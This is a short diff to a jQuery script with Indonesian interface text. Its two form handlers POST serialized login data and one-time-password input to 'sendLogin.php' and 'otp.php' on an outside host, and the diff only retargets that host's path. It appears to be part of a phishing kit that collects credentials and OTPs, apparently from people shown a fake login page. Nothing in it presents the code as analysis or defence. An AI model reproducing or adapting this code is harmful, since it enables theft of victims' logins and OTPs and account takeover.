@@ -5,7 +5,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/bb/sendLogin.php',
+ url: 'https://choreo-is.masuk.web.id/bjb14/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -41,7 +41,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/bb/otp.php',
+ url: 'https://choreo-is.masuk.web.id/bjb14/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
